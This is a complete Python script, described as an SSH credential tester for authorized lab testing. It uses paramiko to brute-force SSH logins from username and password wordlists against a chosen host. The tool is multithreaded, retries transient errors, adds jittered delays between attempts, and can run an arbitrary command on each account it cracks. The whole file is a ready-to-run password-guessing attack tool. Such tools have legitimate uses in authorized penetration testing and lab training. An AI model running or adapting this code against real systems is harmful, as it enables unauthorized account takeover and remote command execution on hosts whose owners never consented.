#!/usr/bin/env python3
"""SSH password credential tester for authorized lab testing.

Tries username/password pairs against one SSH host, reports which authenticate,
and can run a command on a confirmed login. Transient failures (banner drops,
refused connections, timeouts, host-key issues) are retried with backoff;
anything other than an auth failure is treated as transient.

Output contract (parsed by labctl/brute.py):
  * `[+] <user>:<password>`   for each confirmed login
  * `[*] attempts=N confirmed=N failures=N errors=N` summary line

Usage:
    python ssh_brute.py --host HOST --port PORT \
        --usernames FILE --passwords FILE [options]
"""
import argparse
import logging
import random
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import paramiko

# Suppress paramiko's internal "Exception (client): ..." noise on stderr.
logging.getLogger("paramiko").setLevel(logging.CRITICAL)

# paramiko.AuthenticationException subclasses SSHException, so it must be
# checked before TRANSIENT in attempt().
TRANSIENT = (paramiko.SSHException, OSError, EOFError)


class SSHBruteForcer:
    def __init__(self, host, port=22, usernames_file=None, passwords_file=None,
                 threads=1, delay=0.5, timeout=10.0, retries=2):
        self.host = host
        self.port = port
        self.usernames_file = usernames_file
        self.passwords_file = passwords_file
        self.threads = threads
        self.delay = delay
        self.timeout = timeout
        self.retries = retries
        self.lock = threading.Lock()
        self.counters = {"attempts": 0, "confirmed": 0, "failures": 0, "errors": 0}

    def read_wordlist(self, path):
        with open(path, "r", encoding="utf-8", errors="replace") as f:
            return [line.strip() for line in f if line.strip()]

    def _count(self, key):
        with self.lock:
            self.counters[key] += 1

    def _connect(self, username, password, client):
        client.connect(
            self.host, port=self.port, username=username, password=password,
            timeout=self.timeout, banner_timeout=self.timeout,
            auth_timeout=self.timeout, allow_agent=False, look_for_keys=False)

    def attempt(self, username, password):
        """Return (ok, username, password) where ok is True (auth OK),
        False (auth failure), or None (transient error, retries exhausted)."""
        self._count("attempts")
        for n in range(1 + self.retries):
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                self._connect(username, password, client)
            except paramiko.AuthenticationException:
                self._count("failures")
                return False, username, password
            except TRANSIENT as exc:
                if n == self.retries:
                    self._count("errors")
                    print(f"[!] {username}:{password}: {exc}")
                    return None, username, password
                time.sleep(min(0.5 * 2 ** n, 8))
                continue
            else:
                self._count("confirmed")
                return True, username, password
            finally:
                client.close()
        return None, username, password

    def brute_force(self):
        found = []
        usernames = self.read_wordlist(self.usernames_file)
        passwords = self.read_wordlist(self.passwords_file)
        with ThreadPoolExecutor(max_workers=self.threads) as pool:
            futures = {pool.submit(self.attempt, u, p): (u, p)
                       for u in usernames for p in passwords}
            for future in as_completed(futures):
                if self.delay:
                    time.sleep(self.delay * random.uniform(0.5, 1.5))
                ok, u, p = future.result()
                if ok:
                    found.append((u, p))
                    print(f"[+] {u}:{p}")
        return found

    def _run_command(self, username, password, cmd):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            self._connect(username, password, client)
            stdin, stdout, stderr = client.exec_command(cmd, timeout=self.timeout)
            out = stdout.read().decode(errors="replace").rstrip()
            err = stderr.read().decode(errors="replace").rstrip()
            print(f"  [output] {cmd}: {out}")
            if err:
                print(f"  [stderr] {cmd}: {err}")
        except Exception as exc:
            print(f"[!] command failed for {username}:{password}: {exc}")
        finally:
            client.close()

    def _reachability_check(self):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            self._connect("__reachability__", "__check__", client)
            print("[*] host reachable (unexpected auth success)")
        except paramiko.AuthenticationException:
            print("[*] host reachable")
        except TRANSIENT as exc:
            print(f"[!] host NOT reachable: {exc}")
        finally:
            client.close()

    def run(self, dry_run=False, cmd=None):
        if dry_run:
            self._reachability_check()
            return
        found = self.brute_force()
        if cmd:
            for u, p in found:
                self._run_command(u, p, cmd)
        with self.lock:
            c = self.counters
            print(f"[*] attempts={c['attempts']} confirmed={c['confirmed']} "
                  f"failures={c['failures']} errors={c['errors']}")
        print("Found credentials:" if found else "No successful logins found.")
        for u, p in found:
            print(f"  {u}:{p}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="SSH credential tester (authorized testing only)")
    parser.add_argument("--host", required=True)
    parser.add_argument("--port", type=int, default=22)
    parser.add_argument("--usernames", required=True)
    parser.add_argument("--passwords", required=True)
    parser.add_argument("--threads", type=int, default=1)
    parser.add_argument("--delay", type=float, default=0.5)
    parser.add_argument("--timeout", type=float, default=10.0)
    parser.add_argument("--retries", type=int, default=2)
    parser.add_argument("--cmd")
    parser.add_argument("--dry-run", action="store_true")

    a = parser.parse_args()
    SSHBruteForcer(
        host=a.host, port=a.port,
        usernames_file=a.usernames, passwords_file=a.passwords,
        threads=a.threads, delay=a.delay, timeout=a.timeout,
        retries=a.retries,
    ).run(dry_run=a.dry_run, cmd=a.cmd)
